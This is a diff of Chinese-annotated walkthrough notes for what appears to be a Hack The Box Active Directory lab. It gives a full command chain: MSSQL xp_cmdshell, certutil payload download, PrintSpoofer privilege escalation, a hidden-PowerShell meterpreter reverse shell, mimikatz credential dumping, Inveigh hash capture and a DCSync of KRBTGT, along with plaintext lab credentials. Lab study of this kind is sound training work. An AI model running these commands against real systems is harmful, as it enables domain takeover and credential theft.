@@ -61,6 +61,7 @@ sudo nmap -p 88,445,3389 --open 172.16.7.0/24                  网段扫描更�
 bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal                  扫描Domain Controller，无攻击路径
 nmap -A 172.16.7.50                  扫描下一个
 xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution                  RDP 登录 MS01 （非 DC）
+      把本地目录映射到远程桌面的 \\tsclient\share 路径下，/drive:<名称>,<路径>，路径默认当前
 wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1            下载工具
 wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe              下载工具
 scp PowerView.ps1 htb-student@STMIP:/home/htb-student/Desktop                        复制到jump-host
@@ -81,20 +82,50 @@ mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60      用上面的凭证登录
 enable_xp_cmdshell            在 mssql 执行系统命令
 SQL> xp_cmdshell whoami /priv            查看权限，如 SeImpersonatePrivilege
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe            下载工具
-scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop            复制到jump-host
-python3 -m http.server 9000            在 jump-host
-SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe      下载工具
-用 PrintSpoofer.exe 获得系统权限 
+scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop            复制到 jump-host
+python3 -m http.server 9000            在攻击机
+SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe      下载到 jump-host
+用 PrintSpoofer.exe 获得系统权限（用 JuicyPotato, LonelyPotato, RoguePotato, EfsPotato 也行）
       One option is to catch a reverse shell
       or, add a new admin user
       the simplest way forward is simply to change the password for the current local administrator (setting it to Welcome1 in here)
-SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
+SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"            修改 admin 密码
 登录拿旗
-smbclient -U "administrator" \\\\172.16.7.60\\C$
+smbclient -U "administrator" \\\\172.16.7.60\\C$            用 admin 登录
 cd Users\Administrator\Desktop\
 get flag.txt
 exit
 cat flag.txt
+用 msf 再做一次 set payload windows/x64/meterpreter/reverse_tcp
+SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e <ENCODED STRINGS FROM msf>            提权
+(Meterpreter 1)(C:\Windows\system32) > shell
+scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop      复制工具到 jump-host
+(Meterpreter 1)(C:\) > upload mimikatz64.exe            上传到 SQL01
+(Meterpreter 1)(C:\) > shell
+C:\> mimikatz64.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+除了 mimikatz64.exe 用
+sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa
+xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resolution      登录到 MS01
+wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop      获得工具
+C:\> Import-Module .\Inveigh.ps1
+C:\> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y            PS 版 Responder，骗取哈希
+xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution
+net user administrator Welcome1 /domain            更改 admin 密码，或者将 CT059 加入 admin 组
+wmiexec.py administrator@172.16.7.3            用 admin 登录 DC
+type C:\Users\administrator\desktop\flag.txt
+secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT            DCSync 攻击，获得 KRBTGT 的 NTLM 哈希
 
 
-
+更多 AD 视频 和 更多
+https://www.youtube.com/watch?v=wP8ZCczC1OU
+https://www.youtube.com/watch?v=_nGpZ1ydzS8
+https://www.youtube.com/watch?v=PUyhlN-E5MU
+https://www.youtube.com/watch?v=Jaa2LmZaNeU
+https://specterops.io/blog/
+https://blog.harmj0y.net/category/activedirectory/
+https://adsecurity.org/?author=2
+https://shenaniganslabs.io/
+https://dirkjanm.io/
+https://thedfirreport.com/
